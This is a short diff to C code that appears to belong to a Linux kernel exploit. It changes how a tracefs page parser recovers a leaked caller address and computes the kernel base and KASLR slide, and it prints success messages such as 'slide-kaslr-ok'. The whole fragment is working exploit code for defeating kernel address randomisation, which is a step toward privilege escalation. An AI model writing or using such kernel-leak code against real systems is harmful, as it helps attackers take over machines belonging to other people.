@@ -56,11 +56,10 @@ static int slide_tracefs_parse_page(
     if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
-      uint64_t link_caller =
-          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
-      if (caller >= link_caller) {
-        uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+      if (caller >= SLIDE_TRACEFS_WORKER_CALLER_OFF) {
+        uint64_t candidate = caller - SLIDE_TRACEFS_WORKER_CALLER_OFF;
+        if (candidate >= KIMAGE_TEXT_BASE &&
+            (candidate & 0xffffULL) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
@@ -123,14 +122,13 @@ static int slide_tracefs_leak_kernel_base(void) {
     return 0;
   }
 
-  slide_p0_offset = candidate;
-  kaslr_base = KIMAGE_TEXT_BASE + candidate;
-  kaslr_slide = candidate;
+  kaslr_base = candidate;
+  kaslr_slide = candidate - KIMAGE_TEXT_BASE;
   kaslr_done = 1;
   pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
              "slide=%016llx p0_offset=%08zx\n",
              getpid(), (unsigned long long)kaslr_base,
-             (unsigned long long)kaslr_slide, slide_p0_offset);
+             (unsigned long long)kaslr_slide, (size_t)0);
   return 1;
 }
 
